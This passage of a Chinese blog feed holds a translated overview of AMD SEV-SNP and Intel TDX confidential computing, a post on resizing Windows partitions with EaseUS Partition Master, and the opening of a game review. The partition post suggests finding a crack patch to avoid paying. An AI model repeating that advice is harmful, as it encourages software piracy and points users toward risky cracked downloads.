SEV-SNP 使用的页表遍历有很大不同。如图 2 所示，采用 TDX 的系统通过为给定地址选择适当的扩展页表（EPT）来解析客户虚拟地址（gVA）。</p><p><img src="/2025/02/10/%E3%80%8AGeneral%20overview%20of%20AMD%20SEV-SNP%20and%20Intel%20TDX%E3%80%8B%E4%B8%AD%E6%96%87%E7%BF%BB%E8%AF%91/f2.png" alt></p><p>私有扩展页表（EPT）的初始化由 Intel TDX 模块处理，该模块将虚拟机监控程序提供的内存页转换为 TD 所需的私有页。页的完整性保护与 SEV-SNP 类似。然而，与依赖客户虚拟机自行验证其私有页不同，Intel TDX 确保页与其关联的客户物理地址（gPA）的映射在 TD 内部以及跨 TD 边界是唯一的，以避免任何与内存混叠（momory aliasing）相关的漏洞。通过为每个缓存行包含一个 1 位的 TD 标识符，以及可选的 28 位消息认证码（Message Authentication Code, MAC）（其中包含 1 位标识符）来区分共享内存和私有内存，从而确保检测到任何未经授权的内存更改。如果攻击者尝试写入由 TDX 模块保护的页，则下次 TD 尝试从受影响的内存读取时会发生 MAC 验证失败。如果使用不带加密 MAC 的逻辑完整性模式（logical-integrity-mode），此类读取访问将导致 TD 所有权检查失败。与 AMD 的实现不同，客户虚拟机对这些失败的处理方式没有影响，它们将被 TDX 模块终止。由于这些完整性违规行为导致的客户虚拟机强制终止不会影响虚拟机监控程序或其他虚拟机。</p><h2 id="特权级和访问控制"><a href="#特权级和访问控制" class="headerlink" title="特权级和访问控制"></a>特权级和访问控制</h2><p>AMD SEV-SNP 和 Intel TDX 依赖于不同种类的特权级别来实现其完整性保证。</p><h3 id="AMD-SEV-SNP-的特权概念"><a href="#AMD-SEV-SNP-的特权概念" class="headerlink" title="AMD SEV-SNP 的特权概念"></a>AMD SEV-SNP 的特权概念</h3><p>由于默认情况下不再允许虚拟机监控程序修改启用了 SEV-SNP 的虚拟机的状态或内存，安全处理器（SP）需要评估这些请求。这些操作可能包括标准的虚拟机管理命令，例如启动、恢复、挂起和终止虚拟机，它们以前完全由虚拟机监控程序处理。安全处理器还使用为启动认证过程的虚拟机提供的适当密钥，执行远程证明（remote attestation）和引用（quoting）功能。</p><p>除了将安全敏感操作转移到安全处理器之外，SEV-SNP 还支持四个额外的可选虚拟机特权级别（Virtual Machine Privilege Level, VMPL）。它们从 VMPL0 到 VMPL3 编号，其中 VMPL0 表示最高访问权限，VMPL3 表示最低访问权限。这些特权级别可用于进一步划分由 RMP 提供的新访问控制，例如在启用了 SEV-SNP 的客户虚拟机中启用硬件辅助的地址空间隔离。分配给客户虚拟机的每个虚拟 CPU（vCPU）在一个 VMPL 中运行，每个 VMPL 只能授予与其当前拥有的权限相当的权限。这是通过调用 <code>RMPADJUST</code> 指令来实现的，该指令相应地更新必要的 RMP 条目。使用 <code>PVALIDATE</code> 进行的初始页验证仅向 VMPL0 授予完整的读、写和执行权限。在嵌套页表遍历期间执行的页表权限检查的限制性意味着，多个页权限需要相等，才能使客户虚拟机访问该页。因此，页权限验证在客户管理的页表和由 AMD-V 提供的虚拟机监控程序管理的嵌套页表中处理，同时还通过由更高特权的 VMPL 管理的 RMP 表进行验证。</p><p>利用这些不同 VMPL 提供的更细粒度的访问控制，SEV-SNP 客户虚拟机可以创建更具限制性的模拟环境。以前由虚拟机监控程序处理的 APIC 虚拟化可以由在 VMPL0 中运行的软件执行，并将结果传递给在客户虚拟机内部运行的较低特权 VMPL。进一步的任务可以委托给以最高特权级别执行的中间层，例如处理在其他 vCPU 中发生的 #VC 异常，从而提供额外的能力以支持客户虚拟机内部不了解 SEV-SNP 的软件。结合 VMPL 提供的所有这些功能，可以在包含 VMPL0 中间代码的 SEV-SNP 客户虚拟机中嵌套传统（非 SEV-SNP）虚拟机。尽管由于这种转换执行的额外模拟会导致性能略有下降，但它可以使传统工作负载安全运行。图 3 概述了这种架构。</p><p><img src="/2025/02/10/%E3%80%8AGeneral%20overview%20of%20AMD%20SEV-SNP%20and%20Intel%20TDX%E3%80%8B%E4%B8%AD%E6%96%87%E7%BF%BB%E8%AF%91/f3.png" alt></p><h3 id="访问控制所需的-Intel-TDX-组件"><a href="#访问控制所需的-Intel-TDX-组件" class="headerlink" title="访问控制所需的 Intel TDX 组件"></a>访问控制所需的 Intel TDX 组件</h3><p>由于 Intel TDX 采用多组件架构，虚拟机管理和通信涉及更多步骤。Intel TDX 模块托管在由 CPU 的安全仲裁模式（Secure-Arbitration Mode, SEAM）保护的环境中，分配了尽可能多的保留内存，相关信息在 SEAM 范围寄存器（SEAM-range-register, SEAMRR）中进行配置。SEAM 内存的机密性和完整性保证与 Intel TDX 保护的虚拟机类似。禁止任何外部参与者（例如所有软件，无论其是在虚拟机还是虚拟机监控程序中运行）或支持 DMA 的设备访问 SEAM 内存。然而，SEAM 模式下的 CPU 并不完全具有特权，因为它不允许访问其他安全内存区域，例如 Intel SGX 飞地或 CPU 的系统管理模式使用的内存区域。</p><p>TDX 模块的安装和加载是由新引入的 SEAM 加载器（SEAM Loader, SEAMLDR）执行的，它是集成到 Intel 可信执行技术（Trusted Execution Technology, TXT）堆栈中的一个额外的认证代码模块（Authenticated Code Module, ACM）。在被虚拟机监控程序调用后，SEAMLDR 负责验证并随后将 Intel TDX 模块加载到前述的 SEAM 内存范围（SEAM memory range, SEAMMR）中。此外，SEAMLDR 通过 SEAMMR 内的硬件测量寄存器传递安全版本号（Security-Version Number, SVN），并将 TDX 模块置于 SEAM-VMX 根模式。在此初始化过程之后，VMM 可以通过执行 <code>SEAMCALL</code> 指令与 TDX 模块通信并移交控制权。TDX 模块使用 <code>SEAMRET</code> 指令将执行返回给虚拟机监控程序，确保请求的操作（例如 TD 的创建、删除或启动）得以完成。启动或恢复虚拟机是通过 <code>VMLAUNCH</code> 和 <code>VMRESUME</code> 指令实现的，这些指令在将控制权移交给 TD 之前，将 TDX 模块置于 SEAMVMX 非根操作模式中。</p><p>与 AMD 的单一模块架构不同，远程证明是由一个独立的 SGX TDQE 处理的。</p><h2 id="安全能力报告"><a href="#安全能力报告" class="headerlink" title="安全能力报告"></a>安全能力报告</h2><p>正如在第 2.2 小节中提到的，虚拟机监控程序（VMM）能够控制通过 <code>CPUID</code> 提供的信息或使用 <code>RDMSR</code> 从 MSR 读取的信息，这样会带来一些问题。SEV-SNP 和 TDX 旨在防止虚拟机监控程序向虚拟机提供通过上述指令检索到的错误的 CPU 能力信息。</p><p>启用了 SEV-SNP 的客户机可以指示 AMD 的安全处理器（SP）验证通过虚拟机监控程序传递的 <code>CPUID</code> 数据中是否包含主机上不可用的功能，以及关键的安全尺寸信息是否正确。这种过滤可以在每次调用 <code>CPUID</code> 时动态执行，也可以在初始虚拟机启动时执行。如果选择在启动时处理，SP 会在客户机内存中插入两个特殊页面。其中一个页面包含客户机与 SP 之间通信所用的加密密钥，而另一个页面则保存已验证的 <code>CPUID</code> 值。前者通过客户机的私有内存加密密钥进行安全加密，以防止虚拟机监控程序进行任何不必要的访问。由于验证过程仅在虚拟机启动时执行一次，而并非是每次调用 <code>CPUID</code> 时都进行，因此这是一种性能更优的解决方案。</p><p>在使用 Intel TDX 的客户机上，默认情况下会进行 <code>CPUID</code> 验证，无需显式配置。类似于 SEV-SNP，TDX 模块防止虚拟机监控程序报告超出主机系统实际支持的能力。然而，TDX 客户机可以在每次执行 <code>CPUID</code> 时无条件地启用虚拟化异常，从而使虚拟机的操作系统完全控制虚拟机内部软件接收请求 <code>CPUID</code> 信息的方式。</p><p>SEV-SNP 和 TDX 都通过禁止虚拟机监控程序写入这些对安全性敏感的寄存器，来防止对客户机的 MSRs（例如硬件调试寄存器）的干扰。这一过程是自动处理的，不需要对客户机的操作系统进行任何修改。</p><h2 id="TCB-回滚预防"><a href="#TCB-回滚预防" class="headerlink" title="TCB 回滚预防"></a>TCB 回滚预防</h2><p>回滚攻击（rollback attacks）依赖于将可信计算基（Trusted Computing Base, TCB）中包含的组件版本降级，或者恶意报告组件的旧版本，然后利用在最近版本中已经修复的漏洞进行攻击。</p><p>在 SEV-SNP 系统中，安全处理器（SP）确保其固件不会降级到当前运行版本以下。此外，每个 TCB 组件（如 SP）的固件版本通过加密方式与处理器中集成的芯片背书密钥（Chip Endorsment Key, CEK）合并。由于这些改进，客户机所有者现在可以可靠地相信，他们的虚拟机不会以低于他们预先设置的最低版本阈值的错误报告过的固件版本启动。</p><p>由 TDX 模块管理的 TCB 只有在其中包含的每个组件报告的安全版本号（SVN）都高于组件开发者设定的阈值时，才被认为是最新的。这些 SVN 从硬件寄存器加载到由 SEAM 加载器管理的内存中，该内存除了 TDX 模块外任何人都无法访问，从而防止外部参与者进行篡改。因此，如果将此类模块的版本降级到之前设置的版本以下，会导致 TCB 失去其最新状态。如果虚拟机的启动策略要求使用现代 TCB 版本，但当前并未满足此要求，则该虚拟机将无法启动。</p><h2 id="中断和异常注入"><a href="#中断和异常注入" class="headerlink" title="中断和异常注入"></a>中断和异常注入</h2><p>传统上，虚拟机监控程序可以随时注入中断和异常。通常情况下，这不会对虚拟机造成问题，因为所有主要的虚拟机操作系统都支持正确的中断和异常处理。其中一些虚拟机操作系统包含关于中断和异常如何以及何时发生的内置预设，这是由于虚拟机通常尝试尽可能接近地模拟裸机硬件。客户操作系统可能假设在执行有效指令后不会抛出未知操作码异常（#UD），就像真实硬件一样。然而，虚拟机监控程序可以随时注入这些异常。</p><p>为了防止操作系统在处理这些不常见事件时可能出现的尚未发现的问题，AMD SEV-SNP 提供了两种可选配置模式，客户机可以启用这些模式以限制通常未受保护的中断和异常接口。替代注入（alternate injection）提供了默认的虚拟化中断注入和排队（queuing）接口，这些接口通常由虚拟机监控程序使用，但仅允许从虚拟机内部调用。这防止了恶意虚拟机监控程序干扰客户机操作系统，因为用于保存中断信息的字段只能由其他已经能够与客户机数据交互的实体访问。类似于如何使用 VMPL0 作为中间层实现嵌套虚拟化（如 3.3.1 小节所述），中断和异常处理可以通过具有 VMPL0 权限的软件来实现。然而，客户机可能不希望完全阻止虚拟机监控程序注入中断和异常，因此 SEV-SNP 提供了一个称为受限注入（restricted injection）的额外接口。启用了此模式的客户机会完全阻止虚拟机监控程序进行虚拟中断排队，并严格限制可以注入的中断类型。一种新引入的异常——虚拟机监控程序注入异常（#HV），会通知客户机有关虚拟机监控程序的中断，用以代替原本必要的直接传递给虚拟机的中断。虚拟机处理此事件所需的扩展信息可以通过共享内存页面在虚拟机监控程序和客户机之间传递。</p><p>Intel TDX 同样在虚拟机控制结构中跟踪虚拟中断信息和 APIC 数据，这些数据受到保护，防止虚拟机监控程序的访问。用于保存这些信息的页面在 TD 启动时使用与虚拟机关联的私钥来获取。Intel VM-X 进行了调整，以防止将异常传递到信任域，因为虚拟中断和注入的中断由 CPU 硬件管理。确保虚拟机操作系统对中断优先级和屏蔽所做的假设也由 TD 的虚拟中断虚拟化处理。所有这些保证都不需要对客户机操作系统进行任何修改。</p><h2 id="远程证明"><a href="#远程证明" class="headerlink" title="远程证明"></a>远程证明</h2><p>远程证明（remote attestation）是计算服务用户（CSUs）所需的关键功能，因为他们希望验证其部署的虚拟机按照预期运行且未被篡改。证明报告由 CPU 内置组件生成，例如 AMD 系统上的安全处理器（SP）或 Intel 主机上的 TDQE，这些报告包含关于虚拟机本身的多种信息（在启动后和运行期间收集）。先前的扩展仅允许在可信执行环境启动后进行证明，但 SEV-SNP 和 TDX 还支持运行时证明。</p><p>证明过程始终由客户虚拟机发起。SEV-SNP 虚拟机通过使用 <code>SNP_GUEST_REQUEST</code> 固件 API 调用请求安全处理器（SP）为其生成报告，而 TDX 客户虚拟机则调用 TDX 模块的 <code>TDCALL</code> 指令。SEV-SNP 客户虚拟机只需与安全处理器通信，而不需要与其他实体交互来处理证明。这与 TDX 信任域（TD）不同，TDX 信任域首先会请求 TDX 模块生成一般证明报告，然后请求虚拟机监控程序（VMM）使用 TDQE 对其进行引用。引用飞地不能由 TDX 模块直接使用，因为它运行在 SGX 飞地中，SEAM 无法访问。通常，这些信息包括在虚拟机启动期间收集的元数据、一般系统信息、安全敏感组件的版本（例如 TDX 模块或安全处理器的固件）以及由信任域（TD）提供的任意数据。在启用了 SEV-SNP 的系统上，客户虚拟机的所有者还可以在启动后签发一个签名的身份块（Identity Block, IDB），以区分客户虚拟机并使用提供的校验和验证启动。TDX 证明报告还包括在证明过程中创建的 <code>TDINFO_STRUCT</code> 中标识 TD 所有者的字段。虚拟机填充的任意数据通常用于向另一方提供虚拟机的公钥，以便以安全的方式进行通信。云服务用户（CSU）可以信任证明报告是正确生成的，因为报告中包含了参与证明的每个组件的版本以及安全敏感的 CPU 功能（例如同步多线程、SEM）的状态。报告使用每个执行 SEV-SNP 证明的 AMD 芯片独有的版本化芯片背书密钥（VCEK）签名，或者依赖于 Intel TDX 客户虚拟机的供应认证飞地（Provisioning Certification Enclave, PCE）提供的签名密钥。随后，请求认证的一方可以通过使用公司提供的签名验证报告来验证这些报告。图 4 概述了为 SEV-SNP 客户虚拟机生成和传输证明报告的过程。</p><p><img src="/2025/02/10/%E3%80%8AGeneral%20overview%20of%20AMD%20SEV-SNP%20and%20Intel%20TDX%E3%80%8B%E4%B8%AD%E6%96%87%E7%BF%BB%E8%AF%91/f4.png" alt></p><p>由于上述 TDX 的多组件架构，成功传输证明报告需要更多步骤，如图 5 所示。首先，TDX 虚拟机要求 TDX 模块生成证明报告（图 5.1），类似于 SEV-SNP 客户虚拟机从安全处理器（SP）请求报告。使用这个新创建的报告（图 5.2），TD 将其传递给虚拟机监控程序以进行签名过程（图 5.3）。虚拟机监控程序将认证数据传递给 TDQE（图 5.4），TDQE 负责对报告进行加密验证。随后，签名后的信息被传递回虚拟机监控程序（图 5.5）和信任域（图 5.6），最终将报告传递回远程方。</p><p><img src="/2025/02/10/%E3%80%8AGeneral%20overview%20of%20AMD%20SEV-SNP%20and%20Intel%20TDX%E3%80%8B%E4%B8%AD%E6%96%87%E7%BF%BB%E8%AF%91/f5.png" alt></p><h2 id="虚拟机迁移和密封"><a href="#虚拟机迁移和密封" class="headerlink" title="虚拟机迁移和密封"></a>虚拟机迁移和密封</h2><p>由于信任域可能希望在虚拟机执行之间保存数据，SEV-SNP 和 TDX 提供了将数据安全写入持久化存储的方法。SEV-SNP 客户虚拟机可以简单地请求安全处理器（SP）生成本地密封密钥，虚拟机可以信任这些密钥未被恶意行为者篡改，并使用它们来加密不受 SEV-SNP 内存保护的数据。</p><p>SEV-SNP 引入了一个新的 CPU 组件，称为迁移代理（Migration Agent, MA），用于执行客户虚拟机迁移。该代理在同一个主机上的 SEV-SNP 虚拟机内运行，负责验证迁移是否可以安全执行。由于该代理在每个系统上都是活动的，因此需要在客户虚拟机应迁移离开的源物理机和应迁移到的目标机器上运行。TDX 也使用称为迁移信任域（MigTD）的特定服务信任域进行机密虚拟机迁移，该域以类似于 AMD 的 MA 的安全方式处理迁移过程。几乎所有现代云服务提供商（CSP）都支持（运行中的）虚拟机迁移，以简化维护工作并实现动态负载均衡。实时迁移由在两个系统上运行的代理管理，这些代理处理从源到目标的数据重新加密。客户虚拟机需要确保其静态数据（例如不在内存中的数据）通过其他方式（如全盘加密）进行加密，因为 TDX 和 SEV-SNP 都不处理此类数据的保护。</p><h1 id="相关工作"><a href="#相关工作" class="headerlink" title="相关工作"></a>相关工作</h1><p>虽然 SEV-SNP 引入的完整性保证解决了前一代 SEV-ES 扩展中的很多问题，但新的针对于 SEV-SNP 系统的攻击向量已经出现。通过故障注入（fault injection）漏洞攻击 SP，可以提取 SEV-SNP 密钥并解密私有的内存。由于这严重影响了远程证明过程，因此在当前一代 AMD 处理器上无法依赖它来安全地创建报告。此外，还可能存在侧信道攻击（side channel attacks），因为 SEV-SNP 并不阻止对（加密的）虚拟机私有页面的读取访问，这些访问可以用于泄露客户机寄存器值或用于恢复密钥。目前还没有已知的针对 Intel TDX 的漏洞，因为尚未存在实现该技术的硬件。</p><p>对在可信执行环境（TEE）中运行应用程序且无需修改这些应用程序的高需求，也促使了 Gramine 和 Secure CONtainer Environment（SCONE）的创建。两者都通过依赖 SGX 飞地来提供安全环境，利用其机密性保证。Gramine 是一个库操作系统（LibOS），它可以封装一个应用程序，同时保持较低的内存占用，并处理应用程序可能需要的所有操作系统功能。SCONE 允许应用程序在安全的 Docker 容器内运行，并通过提供一个 C 库来保证 TCB（可信计算基）较小。</p><p>IBM 正在为基于 Power ISA 的计算机提供类似的完整性保证，这些保证由 SEV-SNP 和 TDX 确保，使用一种称为保护执行设施（protected execution facility）的基于虚拟机的 TEE。该功能在自 2017 年起可用的 IBM POWER9 芯片上得到支持，并增强了访问控制限制，依赖于多种现有技术，如安全启动和可信平台模块（TPM）。</p><h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>SEV-SNP 和 TDX 在 SEV-SEM 和 SGX 提供的内存机密性保证的基础上，通过强制执行额外的完整性保证，进一步增强了安全性。之所以要转为在基于虚拟机的可信执行环境（TEE）中运行应用程序，在于这减少了开发工作量，因为无需对应用程序代码进行调整。这些新技术允许在由外部参与者管理的系统上安全处理敏感用户数据，这是在云中推动可信执行环境的持续努力中的一个重要里程碑。</p><h1 id="附录"><a href="#附录" class="headerlink" title="附录"></a>附录</h1><h2 id="页表状态"><a href="#页表状态" class="headerlink" title="页表状态"></a>页表状态</h2><p>在 RMP 中跟踪的所有页面都使用页面状态属性进行分类。页面只能处于表 1 所示的以下状态之一。</p><p>处于虚拟机监控程序状态的页面对应于前述的共享（未加密）页面，这些页面可以由虚拟机监控程序或 SEV-SNP 虚拟机自由访问。分配给 SEV-SNP 虚拟机并已由客户机成功验证的页面被标记为 Guest-Valid 状态，这些页面被视为私有页面。通过调用新的 CPU 指令（如 <code>PVALIDATE</code> 或 <code>RMPUPDATE</code>）或使用 AMD 安全处理器中包含的虚拟机管理 API，可以在不同状态之间进行转换。<code>PVALIDATE</code> 指令在客户机内部使用，将页面从 Guest-Invalid 状态移动到 Guest-Valid 状态，并在过程中对其进行验证。这通常是在客户机接收到使用 <code>RMPUPDATE</code> 指令分配的页面后完成的，因为 <code>RMPUPDATE</code> 会清除验证位，将页面标记为不受信任。使用 <code>RMPUPDATE</code> 指令可以从虚拟机监控程序向启用 SEV-SNP 的客户机分配页面，或者从客户机返回给虚拟机监控程序。直接从软件修改 RMP 是被禁止的，只有通过 AMD 安全处理器才能实现，这对于内存访问控制至关重要。</p><p>将页面转变为 <code>Metadata</code>、<code>Firmware</code> 或 <code>Context</code> 状态需要调用 AMD 安全处理器的管理 API，这会使页面变为不可变（immutable）状态，并将其配置为请求的状态。</p><p><img src="/2025/02/10/%E3%80%8AGeneral%20overview%20of%20AMD%20SEV-SNP%20and%20Intel%20TDX%E3%80%8B%E4%B8%AD%E6%96%87%E7%BF%BB%E8%AF%91/t1.png" alt></p><h2 id="开发经验"><a href="#开发经验" class="headerlink" title="开发经验"></a>开发经验</h2><p>要开发利用 SEV-SNP 和 TDX 新引入的功能的软件，需要一个稳定的函数和指令规范以及支持这些扩展的硬件。虽然 AMD 已经提供了支持 SEV-SNP 的处理器，但 Intel 当前一代芯片仍缺乏任何硬件支持。然而，Intel 已经发布了 TDX 的应用二进制接口（ABI），使开发者能够开始软件的开发。AMD 通过一个 Rust 库提供对安全处理器的 API 访问，该库自 2022 年 10 月起支持 SEV-SNP。利用这些库和工具可以创建虚拟机并与必要的安全组件进行通信。用于验证证明报告的证书由芯片制造商发布，并且每一代芯片的证书都是公开可用的。</p><p>由于在页表遍历过程中使用的新组件需要对内存写入客户机私有页面进行额外的访问验证，性能可能会下降。实际影响尚未测量，因为 AMD 和 Intel 最近和正在进行的开发工作仍在影响实现细节。之前讨论的 CPU 测量指令（如 <code>CPUID</code>）也因为安全处理器和 TDX 模块提供的额外验证而变得较慢。</p>]]></content>
    
    
    <summary type="html">&lt;p&gt;本文为论文《General overview of AMD SEV-SNP and Intel TDX》的中文翻译，翻译工具使用大模型 DeepSeek v3 和通义千问 2.5，经过了本人的核对与校正。由于本人在机密计算领域还处在初学阶段，因此一些专有名词的翻译可能存在问题，欢迎指出。&lt;/p&gt;</summary>
    
    
    
    <category term="操作系统" scheme="http://lordaeronesz.github.io/categories/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/"/>
    
    
    <category term="操作系统" scheme="http://lordaeronesz.github.io/tags/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/"/>
    
    <category term="翻译" scheme="http://lordaeronesz.github.io/tags/%E7%BF%BB%E8%AF%91/"/>
    
    <category term="机密计算" scheme="http://lordaeronesz.github.io/tags/%E6%9C%BA%E5%AF%86%E8%AE%A1%E7%AE%97/"/>
    
    <category term="虚拟化" scheme="http://lordaeronesz.github.io/tags/%E8%99%9A%E6%8B%9F%E5%8C%96/"/>
    
  </entry>
  
  <entry>
    <title>将D盘空间划分给C盘</title>
    <link href="http://lordaeronesz.github.io/2025/02/03/%E5%B0%86D%E7%9B%98%E7%A9%BA%E9%97%B4%E5%88%92%E5%88%86%E7%BB%99C%E7%9B%98/"/>
    <id>http://lordaeronesz.github.io/2025/02/03/%E5%B0%86D%E7%9B%98%E7%A9%BA%E9%97%B4%E5%88%92%E5%88%86%E7%BB%99C%E7%9B%98/</id>
    <published>2025-02-03T02:46:29.000Z</published>
    <updated>2025-02-03T04:33:47.418Z</updated>
    
    <content type="html"><![CDATA[<p>前段时间换了刚刚换了新的机械革命的笔记本，发现拿到手时磁盘已经预先分好了区，但是 C 盘（系统盘）只分了 200 GB。在装了 WSL 等一些必备的环境后，就只剩下不到 100 GB，感觉很没有安全感（😩），于是就想办法给 C 盘划分更多的空间，以下是一些经验分享。</p><span id="more"></span><h1 id="尝试使用系统自带工具"><a href="#尝试使用系统自带工具" class="headerlink" title="尝试使用系统自带工具"></a>尝试使用系统自带工具</h1><p>首先，我尝试着使用 Windows 自带的磁盘管理工具（Windows 11 下右键底部的“开始”键）。</p><p>开始的设想是：首先对 D 盘进行“压缩卷”将一部分空闲的存储空间转为“未分配”状态，然后对 C 盘执行”扩展卷“将刚腾出来的”未分配“空间给合并。但是发现 C 盘的”扩展卷“选项是灰色的，不可选。查阅资料得知一个磁盘在进行扩展卷时只能合并与之相邻的磁盘分区，而”压缩卷“腾出的空闲空间是位于磁盘右侧的，该空间无法与 C 盘进行合并，只能重新合入 D 盘中。</p><p><img src="/2025/02/03/%E5%B0%86D%E7%9B%98%E7%A9%BA%E9%97%B4%E5%88%92%E5%88%86%E7%BB%99C%E7%9B%98/partition.png" alt></p><h1 id="借助第三方工具"><a href="#借助第三方工具" class="headerlink" title="借助第三方工具"></a>借助第三方工具</h1><p>要想使得 C 盘能够合并 D 盘的空闲空间，就必须使得 D 盘划分出的空闲空间位于 D 盘的左侧，而这必然涉及到磁盘数据的移动，存在数据丢失的风险，Windows 也并没有提供这样的功能。</p><p>于是转而寻求第三方工具的帮助，最终发现了一个强大的磁盘处理软件——EaseUS Partition Master。该软件包括很多高级的磁盘处理功能，其中就包括“左右自由划分磁盘分区”。</p><p><img src="/2025/02/03/%E5%B0%86D%E7%9B%98%E7%A9%BA%E9%97%B4%E5%88%92%E5%88%86%E7%BB%99C%E7%9B%98/ease.png" alt></p><p>可以在 D 盘左侧划分出一片空闲空间，随后 C 盘便可以将其合并了。</p><blockquote><p> 注意，该软件的此功能为收费功能，若不想为之付费，可自行寻找破解补丁。</p></blockquote><p>最终，C 盘成功被扩展。</p><p><img src="/2025/02/03/%E5%B0%86D%E7%9B%98%E7%A9%BA%E9%97%B4%E5%88%92%E5%88%86%E7%BB%99C%E7%9B%98/disk.png" alt></p>]]></content>
    
    
    <summary type="html">&lt;p&gt;前段时间换了刚刚换了新的机械革命的笔记本，发现拿到手时磁盘已经预先分好了区，但是 C 盘（系统盘）只分了 200 GB。在装了 WSL 等一些必备的环境后，就只剩下不到 100 GB，感觉很没有安全感（😩），于是就想办法给 C 盘划分更多的空间，以下是一些经验分享。&lt;/p&gt;</summary>
    
    
    
    <category term="经验" scheme="http://lordaeronesz.github.io/categories/%E7%BB%8F%E9%AA%8C/"/>
    
    
    <category term="经验" scheme="http://lordaeronesz.github.io/tags/%E7%BB%8F%E9%AA%8C/"/>
    
    <category term="Windows11" scheme="http://lordaeronesz.github.io/tags/Windows11/"/>
    
    <category term="磁盘管理" scheme="http://lordaeronesz.github.io/tags/%E7%A3%81%E7%9B%98%E7%AE%A1%E7%90%86/"/>
    
  </entry>
  
  <entry>
    <title>《最终幻想7：重生》体验分享</title>
    <link href="http://lordaeronesz.github.io/2025/01/18/%E3%80%8A%E6%9C%80%E7%BB%88%E5%B9%BB%E6%83%B37%EF%BC%9A%E9%87%8D%E7%94%9F%E3%80%8B%E4%BD%93%E9%AA%8C%E5%88%86%E4%BA%AB/"/>
    <id>http://lordaeronesz.github.io/2025/01/18/%E3%80%8A%E6%9C%80%E7%BB%88%E5%B9%BB%E6%83%B37%EF%BC%9A%E9%87%8D%E7%94%9F%E3%80%8B%E4%BD%93%E9%AA%8C%E5%88%86%E4%BA%AB/</id>
    <published>2025-01-18T02:29:06.000Z</published>
    <updated>2025-01-18T07:24:14.788Z</updated>
    
    <content type="html"><![CDATA[<p>《最终幻想7：重生》是我 2024 年最期待的游戏之一。由于发售时还没有 PS5，加上考研复试等事务缠身，没能第一时间体验。后来，后面为了剧情体验的连贯性，我又重温了一遍四年前的《最终幻想7：重制版》，直到最近两个月才正式开坑。</p><p>历经 87 小时通关一周目后，内心感慨万千，不吐不快，于是便有了这篇体验分享。整体而言，《最终幻想7：重生》无愧于我 2024 年的年度游戏，甚至在 jrpg 品类中几乎稳坐我心中的头把交椅。但它并非完美，其中仍有一些让我不太满意或感到遗憾的地方，接下来便一一细说。</p><blockquote><p>提示：本文存在剧透内容。</p></blockquote><h1 id="广阔，未必自由"><a href="#广阔，未必自由" class="headerlink" title="广阔，未必自由"></a>广阔，未必自由</h1><p>相较于重制版第一作，《重生》最大的进化便是引入了一个可供探索的大地图。但请注意，尽管游戏的地图很大，我却很难称之为“开放世界”。实际上，游戏并未表现出什么构建一个生动、真实的奇幻世界的意图，而是通过一个个清单项来构成世界。而这势必会导致游戏体验上的重复，制作组为了缓解这种枯燥感，尽可能地在这些重复的清单项中引入了差异化设计。例如，同样是捕获陆行鸟，不同地区有不同的解决方式，这些在一定程度上确实减轻了重复感。</p><p>支线任务方面，相比上一作，《重生》有了显著的变化：每个支线任务与队伍中的某个角色相关，完成后可以提升该角色的好感度（与后期金蝶游乐园事件的触发相关），任务的完成情况有两档，完美完成时好感度的提升会更多（推测，未求证）。这其实也表明，《重生》的支线任务和一众美式 RPG 为了描绘世界不同，更专注于塑造队伍中角色的人物性格，强化主角克劳德与队友之间的羁绊。以这样一个视角来审视《重生》的支线任务，个人认为表现的还算不错。</p><p><img src="/2025/01/18/%E3%80%8A%E6%9C%80%E7%BB%88%E5%B9%BB%E6%83%B37%EF%BC%9A%E9%87%8D%E7%94%9F%E3%80%8B%E4%BD%93%E9%AA%8C%E5%88%86%E4%BA%AB/world.jpg" alt></p><p>在前期，剧情还未展开时，这样的清单项世界体验还算不错。但到了中后期，主线剧情逐渐变得更吸引人的情况下，游戏却频繁地向玩家抛出新的可探索区域，让游玩体验变得略显疲惫。我印象中这个问题最明显的区域便是星陨峡谷和尼泊尔海姆这一段，一是它们是游戏最后解锁的两个区域，玩家此时已经疲于探索，另外，这部分的主线剧情比较紧凑，很多人可能不愿停下来清理这些清单项。虽说清单项并非一定得做，但是之前没有提到的是，《重生》的清单项世界其实很大程度上是奖励驱动的，探索的收益十分丰厚，尤其是召唤兽的弱化和装备设计图纸，这些与游戏的核心玩法——战斗系统息息相关。因此，就算不为了清单项本身的游玩乐趣，冲着角色 build 强度去也很难不做。</p><p>至于社区中普遍诟病的小游戏和地图设计，我个人反倒体验还好。首先是小游戏，因为个人暂时也不追求白金，所以这部分感觉还算良好，大部分主线或支线中的小游戏若只是想通过基本上尝试一两次也就差不多了，也能起到一定调剂游戏节奏的作用。而像一些比较繁琐且耗时较长的，比如前往太阳海岸途中的女皇之血大赛，游戏也提供了直接跳过的选项（虽然个人并没有跳过）。而关于地图设计，在我看来问题主要源于 SE 的技术力限制，角色与场景间的交互体验相比同类型游戏来说比较糟糕：陆行鸟手感较差，角色攀爬和推箱子等动作十分缓慢且僵硬，还有一些反直觉的空气墙等等…… 而箱庭地图的结构设计本身，个人认为还是可圈可点的，不算优秀，但也在及格线以上的水平。</p><h1 id="指令与动作的交响曲"><a href="#指令与动作的交响曲" class="headerlink" title="指令与动作的交响曲"></a>指令与动作的交响曲</h1><p>在《最终幻想7：重制版》中，相较于原作，战斗系统迎来了巨大的革新——它以 ATB 指令为核心，同时融入了一定的动作性。我当时便对这套系统十分喜爱，并给予了很高的评价。此次重温，更让我再次体会到其设计的精妙之处，但也确实发现了一些不够成熟的地方。</p><p>首先是对于空中敌人的应对，可以说体验很糟糕。克劳德、蒂法等近战角色无法在空中打出连段，要想比较高效地进行输出，往往只能依赖于魔法，这很大程度上限制了战斗系统的发挥空间。其次，动作与指令的边界感比较模糊。具体来说，游戏中有很多敌人招式非常反直觉，有些招式看似能躲开，其实是指令锁定；而有些招式则更具动作性，基本所见即所得。这种边界的不清晰，让战斗在某些时刻显得不够流畅。</p><p>而要解决上述问题，我认为最好的方法便是明确动作和指令的界限——要么进一步强化动作性，使战斗更加流畅；要么让系统更偏向指令式，突出策略性。而从最终的呈现效果来看，制作组显然选择了前者。《重生》的战斗系统上手的第一感觉便是爽快。近战角色现在引入了空中连段，原本需要装备特定魔石才能解锁的范围普攻，在这一作中成为了默认能力，而克劳德甚至新增了远程普通攻击和快速近身突进。这些改动极大提升了战斗的流畅度，并显著加快了节奏。除此以外，游戏还引入了动作游戏中常见的完美防御机制，不仅让战斗系统的上限进一步提高，也极大改善了原本模糊的指